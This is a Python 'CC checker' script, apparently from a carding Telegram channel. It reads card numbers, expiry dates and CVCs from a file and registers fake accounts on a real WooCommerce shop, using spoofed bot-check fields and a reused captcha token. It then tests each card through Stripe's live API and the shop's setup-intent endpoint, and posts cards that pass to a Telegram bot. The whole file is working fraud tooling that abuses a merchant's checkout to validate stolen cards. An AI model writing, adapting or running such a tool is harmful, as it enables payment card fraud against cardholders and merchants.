import requests
import re
import time
import random
import json
import string
import time
import random
import json
import string
import base64
from bs4 import BeautifulSoup
import requests
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent

Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'
W = Fore.WHITE
L = Fore.BLUE

# Set constants
MAX_RETRIES = 3
RETRY_DELAY = 1  # seconds

# Set combo file to 'cc.txt' by default
combo = 'cc.txt'
y = open(combo, "+r")

# Set token and ID automatically
token = ''
ID = ''

# Define a function to make a POST request with retries
def make_request(url, params=None, cookies=None, headers=None, data=None):
    attempts = 0
    while attempts < MAX_RETRIES:
        try:
            response = requests.post(url, params=params, cookies=cookies, headers=headers, data=data)
            return response
        except requests.exceptions.ConnectionError as e:
            attempts += 1
            if attempts < MAX_RETRIES:
                print(f"Connection error, retrying in {RETRY_DELAY} seconds...")
                time.sleep(RETRY_DELAY)
            else:
                print(f"Max retries exceeded, skipping request. Error: {e}")
                return None

# Define a function to generate a random user agent
def generate_random_user_agent():
    user_agent = UserAgent()
    return user_agent.random

# Print the ASCII art
print("\033[1;31m" + "□■" * 30)
ascii_art = pyfiglet.figlet_format("   ➤VorTex ™ ")
print("\033[1;34m" + ascii_art)
print("\033[2;32m" + "□■" * 30)

# Open the Telegram channel in the browser
webbrowser.open('https://t.me/RexxCheat')
print('\t\033[1;31m>>> Join Me Channel @RexxCheat ')
print('\t\x1b[38;5;153m @RexxCheat <--')

# Print the separator
o = ("------------------------------------------------------------")
print("\033[2;36m" + o)

# Set the combo file
print("\033[2;33m" + f'Using combo file: {combo}')
print("\033[2;32m" + "CC CHECKER V2")

start_num = 0
F = '\033[2;32m'
Z= '\033[2;31m'
for y in y:
	start_num += 1
	ccx = y.strip().split('\n')[0]
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#RexxCheat
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}

	response = r.get('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://www.baileybox.com',
	    'Referer': 'https://www.baileybox.com/my-account/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'username': username,
	    'email': acc,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	    'ak_bib': '1725448457761',
	    'ak_bfs': '1725448470119',
	    'ak_bkpc': '6',
	    'ak_bkp': '20;19;6,129;4;7;4,149;',
	    'ak_bmc': '14;5,1906;20,2220;3,1393;8,7788;',
	    'ak_bmcc': '5',
	    'ak_bmk': '',
	    'ak_bck': '',
	    'ak_bmmc': '1',
	    'ak_btmc': '6',
	    'ak_bsc': '7',
	    'ak_bte': '93;455,118;105,195;412,159;389,368;309,404;314,2227;38,179;343,1261;65,263;230,1719;57,217;81,1344;295,1864;88,5529;',
	    'ak_btec': '15',
	    'ak_bmm': '14,56;',
	}
	
	response = r.post('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.baileybox.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': user,
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = r.get('https://www.baileybox.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
	data = f'type=card&owner[name]=+&owner[email]=sncjsid80038%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=9772eae0-43ee-429a-87eb-aef5931fa9e1c7aa14&muid=1d6a9996-f242-43e3-92a3-68199388772513daf3&sid=d8cc16f9-ac32-48d5-8abe-d47a4d0fc605d60560&pasted_fields=number&payment_user_agent=stripe.js%2F8dafd05b54%3B+stripe-js-v3%2F8dafd05b54%3B+card-element&referrer=https%3A%2F%2Fwww.baileybox.com&time_on_page=74211&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiWHpyZjdmM3NUVTBZSlkraEM3enZLelgrb1htM2FmZlpxWHhmOXpRZ3lNKzl3am5xSWQwNS9xR2dkYVRuNnFCRy8yZys2UGZ0ZVpXQUU5bWJmQmUxYjN1WVFDeWFHUk1EVDNJa0pvMnFHQmtqdGhpZVlqMVBpNnlmTzQvemszUDQ4YkF4a2ZoeS96QTd6K0poZUhSNUVOZXd0Q2NVTTVlVjZ6QitQNGVhaE91enRJOXVEOTh6Mk5UYzg3QXozK0JXV3c5NUJTcVF0L21PcmlPTnppQlp5ZExSU1NWQ1hZNUdHYlkrdEQ3ZDJyL2pQY1Bja0VtYzJhMlBrVnZSU0tFQU9YRmhaMVlHODEydFpDd2dFQ0VUWWxDUmgrckIrclRaTUVuTGkzY3hzSWhNUXluZ1dPbWNXN0Rna1NYa3JEbzJZUEhseXlmWUtzLzdGcUNtc2F3RENMRkZpR0YzSEdrVG9EcjBCSEpGWWh4RVBYaklhM04ydDBiOSsxaVZVV2cxZTg2M3NoV1gyT29sQlRQL2g5SnROZGNRQnVpei9PdWIrNXZxMStYanljTVRNN04xWlIvZ296SkVLY1h3VitNUS8weTdPcnFLa3dXOUNyZjdIVTU1cXpKaTVkV1ZCSzcremJ6aFcrZDhTUllzdHlnamlpL2tKaXdoai9JbUR4SFo5dUdvM3ZOWUwrY3NtOHZzdlJ6UEZUd3h4ZFVWNlN6NjhnMkpxelNDd01ycGxsb3hoODNyaGZHbEFxUXV6aGVybGVORlVQRmU2czgyUkFCa2FSYXJEUXAxQlNHa1ZzNzdiNmVwa0pyTldKcnhHMFp3b3hoZy9kaUMxUFp2MWdFU0IxN2ZJbHRBa1dJWFFIWTJ5RVJtMmV0WFduYkZaYmx2VmMvNE1qdGNibk15dlVVcXJFazZWRFJpNmd5RDRHczhzN0ZnRmRBOXhhTjB2ZTE2ZEhjbzE2cFJIais1aFRhcGZiSWVQOFUzQUJ6NldCUDdLMGsyQnhqSVdiL3VJUXJzNFVOTmFrTlNRTXJsZGIzSWVvcGpZbGhpVTVCK1pzOWx4UEJIQ0h4TUVTbnpIQ2lqanU4OFhkeEJSd056djExNE9KcDNnMTZrZnlMZGZvL3dTR25CTFI2ZkovcXVadSs0NHEyR05yTmpFdnJuMnp3WDVMdHJINkovSW4wR2pPeDN1UUJTMnhkeDczNm43S2ZFNllWcGhSM295TFpCeEtJbHdockwxQWFwRGk3V2ZsY1JxR1RwNlNUbU5RSCtRbnFNNldkdjNOaFJLM3QxUmZDb0N1MVNieDBaTGZIaUt6RmFVZ2ZjSzUwdkhRb1A4czZDV1VhakNZNmIrZFFyYWhRRjRhdENjUzlQQnZRMVpPTEtXSVdDcUxZbThvQWZUYzhGcFIwT2xydFlROFg0WWN3Q1VBT0ZVc0ZTY3NpYTVlY2pvRi9ZcG1kcDBCY1BNeVVmTnBFck1NZmZGZXczUGt0NjN1djVjckJkdStOaWtiZTNwUkF0aHZxN1pMNzNpZEtQOUNmTkZZVlMrQWhMQWtjMXpGcTNzaEdaTUdQM0MyUjFLMFNMbU56ZlREN0dzZ2dpOTRHd01sY2ZWWHU3dTRhcEpsUWorTUg0WlQ4Q3djMTRDNFlzQUM4MWVWQkhBdHhIZmtTK2kyaE5BcDREVVhsMXZpN2pHeXBRa0dFUStvTGVKVjkzbFZOTnJ6cXVkWGpnbzE5enpETG50VU9icnZPNWx0U241VnN5dFl5OGY4U3d5SmhoTnhFR2d2QW1XamIyYlVMZ3Q1NVhpd0ZQV25UR1F2M0pSTnVQaElUZnEyQ3ZGVG1WSmdFQ2xqRXB5cm10Y2hRMU1GUWlVeE1WK1hITEFXOVAwNEF1bDU1OXYwK01VQVVUYWZXbEVsbndsQVdaeUJuZmdCNWZtcXpSbnVBWEhNdjcvemF0eXkyNnpwZjhGRVNYM2daalhqaXBTSE9YTExTM1NOU21HT0tWMDJaYWR4WDBIRFFnNzVhSXFIL1E5cGFJSGprSVNqMVVjUWFzMG0zRWRDd3FqRHRidWh2SVdOb1FYRlpkdE0wMWMyb21Ga1pJa0FiZFJiUnJvNTY3Wjd0Z2o5Y1hZQ29jM05zTGQ5bTZieURKbmppNmVuMW1ROHRIUFBYaE1uUVZkbEJLVGtBQnBWcEhIVFE2TE82L1pNdlcxSWNsZDd4M1BNMTEyUFlNMEp3ZnRUS3JZV1J2TlNPWXR5TW1ZeTBTWE81a2pGVnBia2RITXRMWTg3aEQ5ZlBLTnREeW9vQ3pESkJGbG84S0ozKzhHTlVpNXQwRlJqQ0dyT1FxYXQxcmRjTjIyT3ZhZHIxbjJzRURUTGRLREIzU3p5TmZ1cTRFa1hmUHFlS3R2a3NOUU0zWlhJMU91Q0lOMmhlNFkvaDdMcHJFTFdnQTl6a3ZkeXRTeXBQMXlKWE1vS0VWaWJLUXM4QnVDQWovek5UNjhjcGVrS2pOYTRralJlellScGE1N0dMYVZWejB5ZmZsTC85dkNvRmErakJuN1cwZlFCNHZOVlVGL2RtNndGUVMySTRLOERFbFpiRFBMOWlOZVRyUzVqemIyWmZ2bDdhbHhHL1E2cUl0enRVQklFVmkwZmJBVDJJYzdzazdhR0Fndld2VWhaWVg5Y25ZT2tpem5BZ2xqbjdTWVptSkMvY0dmV09NU21uMlBoMEFjekEzcFdqdWFsUThPSjcxcS9sVEZFcmFyRytDWFV1RXdEaHg4bHZ6L1ZHR0JOczQ4bHU5aGtreHZ6cS9CQ3dLbDE2MThwSnZ3bkVtbHNRPSIsImV4cCI6MTcyNTQ0ODY5Miwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjE3YTczNWUxIiwicGQiOjAsImNkYXRhIjoid0N0MzdwSFp1MWdxRTA4bFFxcFQ5NEEwZU5RcFREU09udWRpZFNUUlBpTFBEWXROb2NVbmh0VHBaZC9qbk8rQmtuSExwaE4wOWlTQjlNcHVXYy95dmJwbjJEU0hJZ3ZOQ1g0ekxMWHpacS9oR0dJejkrcWxsekM3VUdYS3pEZ245aFRHTk1YaExNSm83S3lwTnpWWE9YSm5pMzR3OEErdlpOck5QK1lFdXNTbmtDOXNkN0JFMXp5QXMxbWE1OWdxdmNwd1F1bHB3NHN6U29qSyJ9.8LSYADkGSDWIflOI6UBjUvDWSLOOFhO7Afa31l5GaTs&key=pk_live_51HUGqfI9BolQkZWDB1L6wy1IWAxxumF7xYlt1LKuwPhpun0DERaQiGOH4UANnUlRM6LoXTmzvHKNaZevOFszeEzT00sc2dZpvN'
	
	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Origin': 'https://www.baileybox.com',
	    'Referer': 'https://www.baileybox.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': user,
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
response = r.post('https://www.baileybox.com/', params=params, cookies=r.cookies, headers=headers, data=data)
msg = response.text

if 'success' in msg:
    print(Fore.GREEN + f"{ccx} >> APPROVED ✅")
    requests.post(
        f"https://api.telegram.org/bot{token}/sendMessage",
        json={
            "chat_id": ID,
            "text": f"""
┃ 🆔 𝐂𝐚𝐫𝐝 ➜ `{ccx}`
┃ 🔥 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ **Approved! ✅**
┃ 📝 𝐑𝐞𝐬𝐮𝐥𝐭 ➜ **CCN LIVE**
┃ 💳 𝐆𝐚𝐭𝐞ᴡᴀʏ ➜ **Stripe $15**""",
            "parse_mode": "Markdown"
        }
    )
else:
    print(Fore.RED + f"{ccx} >> DECLINED ❌")
